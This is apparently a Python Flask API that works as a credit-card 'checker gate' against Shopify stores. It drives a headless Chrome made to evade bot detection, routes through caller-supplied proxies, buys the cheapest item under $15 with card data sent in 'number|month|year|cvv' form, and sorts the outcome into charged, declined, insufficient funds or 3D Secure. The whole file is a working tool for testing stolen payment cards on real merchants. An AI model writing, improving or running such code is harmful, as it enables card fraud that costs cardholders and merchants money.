import os
import time
import random
import json
from flask import Flask, request, jsonify
from seleniumwire import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

app = Flask(__name__)
MAX_PRICE = 15.0

def setup_driver(proxy=None):
    chrome_options = Options()
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)

    seleniumwire_options = {}
    if proxy:
        seleniumwire_options = {
            'proxy': {
                'http': proxy,
                'https': proxy,
                'no_proxy': 'localhost,127.0.0.1'
            }
        }

    driver = webdriver.Chrome(
        service=Service(ChromeDriverManager().install()),
        options=chrome_options,
        seleniumwire_options=seleniumwire_options
    )
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    return driver

def get_shopify_product(site, driver):
    try:
        if not site.startswith('http'): site = f'https://{site}'
        driver.get(f"{site.rstrip('/')}/products.json")
        time.sleep(4)
        body = driver.find_element(By.TAG_NAME, "body").text
        data = json.loads(body)
        variants = []
        for prod in data.get('products', []):
            for var in prod.get('variants', []):
                if var.get('available'):
                    variants.append({'id': var.get('id'), 'price': float(var.get('price', 0))})
        if variants: return min(variants, key=lambda x: x['price'])
    except Exception:
        return None
    return None

def shopify_checkout_real(site, cc, driver):
    product = get_shopify_product(site, driver)
    if not product:
        return {"Response": "Proxy Error or Site Blocked", "Price": "-", "Gate": "Shopify"}

    price_str = f"${product['price']:.2f}"
    if product['price'] > MAX_PRICE:
        return {"Response": "Price Exceeds Limit", "Price": price_str, "Gate": "Shopify"}

    try:
        card, month, year, cvv = cc.split('|')
    except:
        return {"Response": "Invalid CC Format", "Price": price_str, "Gate": "Shopify"}

    try:
        cart_url = f"{site.rstrip('/')}/cart/{product['id']}:1"
        driver.get(cart_url)
        time.sleep(4)

        try:
            checkout_btn = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.NAME, "checkout")))
            checkout_btn.click()
        except:
            driver.get(f"{site.rstrip('/')}/checkout")
        
        time.sleep(6)

        if "captcha" in driver.page_source.lower() or "access denied" in driver.page_source.lower():
            return {"Response": "Blocked by Shopify / Captcha detected", "Price": price_str, "Gate": "Shopify"}

        try:
            email_field = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, "email")))
            email_field.send_keys(f"test{random.randint(1000,9999)}@gmail.com")
        except: pass

        try:
            iframe = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//iframe[contains(@title, 'payment') or contains(@name, 'card') or contains(@id, 'card')]"))
            )
            driver.switch_to.frame(iframe)
        except:
            pass

        try:
            card_field = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, "number")))
            card_field.send_keys(card)
            driver.find_element(By.NAME, "name").send_keys("Test User")
            driver.find_element(By.NAME, "expiry").send_keys(f"{month}/{year}")
            driver.find_element(By.NAME, "verification_value").send_keys(cvv)
        except Exception as e:
            return {"Response": "Form Fill Error", "Price": price_str, "Gate": "Shopify"}
        finally:
            try: driver.switch_to.default_content()
            except: pass

        try:
            pay_button = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "continue_button")))
            pay_button.click()
        except:
            return {"Response": "Could not find Pay Button", "Price": price_str, "Gate": "Shopify"}

        time.sleep(15) 
        
        page_text = driver.find_element(By.TAG_NAME, "body").text.lower()
        
        if "thank you" in page_text or "order confirmed" in page_text:
            return {"Response": "Order Placed (Charged)", "Price": price_str, "Gate": "Shopify"}
        elif "insufficient funds" in page_text:
            return {"Response": "Insufficient Funds", "Price": price_str, "Gate": "Shopify"}
        elif "declined" in page_text or "was declined" in page_text:
            return {"Response": "Card Declined", "Price": price_str, "Gate": "Shopify"}
        elif "incorrect" in page_text or "invalid" in page_text or "check your" in page_text:
            return {"Response": "Invalid Card Details", "Price": price_str, "Gate": "Shopify"}
        elif "3d" in page_text or "authentication" in page_text or "verify" in page_text:
            return {"Response": "3D Secure Required", "Price": price_str, "Gate": "Shopify"}
        else:
            clean_text = " ".join(page_text.split())
            return {"Response": f"Gateway Says: {clean_text[:150]}", "Price": price_str, "Gate": "Shopify"}

    except Exception as e:
        return {"Response": f"Browser Error: {str(e)}", "Price": price_str, "Gate": "Shopify"}
    finally:
        driver.quit()

@app.route('/shopify', methods=['GET'])
def shopify_endpoint():
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')

    if not site or not cc:
        return jsonify({"Response": "Missing Parameters", "Price": "-", "Gate": "None"})

    try:
        driver = setup_driver(proxy=proxy)
        result = shopify_checkout_real(site, cc, driver)
        return jsonify(result)
    except Exception as e:
        return jsonify({"Response": f"Setup Error: {str(e)}", "Price": "-", "Gate": "Shopify"})

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
